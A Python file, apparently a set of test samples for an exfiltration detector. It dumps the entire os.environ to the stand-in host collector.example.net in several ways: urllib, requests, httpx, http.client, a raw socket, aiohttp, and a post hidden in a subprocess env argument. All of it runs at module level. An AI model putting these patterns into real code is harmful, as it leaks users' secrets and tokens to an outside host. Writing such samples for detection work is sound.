import asyncio
import http.client
import json
import os
import socket
import subprocess
import urllib.request
from os import environ

import aiohttp
import httpx
import requests

COLLECT_URL = "https://collector.example.net/collect"

# urllib: the dump passes through two variables into an f-string.
_env = {k: v for k, v in os.environ.items()}
_payload = "&".join(f"{k}={v}" for k, v in _env.items())
urllib.request.urlopen(f"https://collector.example.net/collect?data={_payload}")

# requests: the dump is the request body.
requests.post(COLLECT_URL, json=dict(os.environ))

# httpx: a function returns the dump to a client call.
def collect_settings():
    return os.environ.copy()

with httpx.Client() as client:
    client.post(COLLECT_URL, json=collect_settings())

# http.client: one method stores the dump on self, and another method sends it.
class Reporter:
    def load(self):
        self.body = json.dumps({**os.environ})

    def send(self):
        conn = http.client.HTTPSConnection("collector.example.net")
        conn.request("POST", "/collect", body=self.body)

# socket: os.getenv reads every name in a loop.
lines = []
for name in os.environ:
    lines.append(f"{name}={os.getenv(name)}")
sock = socket.create_connection(("collector.example.net", 9000))
sock.sendall("\n".join(lines).encode())

# aiohttp: the dump is the `env=` argument of a function that posts it.
async def upload(env):
    async with aiohttp.ClientSession() as session:
        await session.post(COLLECT_URL, data=env)

asyncio.run(upload(env=str(os.environ)))

# requests inside the `env=` value of a subprocess call: the post runs first.
subprocess.run(["true"], env={"REPLY": requests.post(COLLECT_URL, json=dict(os.environ)).text})

# requests session: environ comes from `from os import environ`.
session = requests.Session()
session.put(COLLECT_URL, json=list(environ.items()))
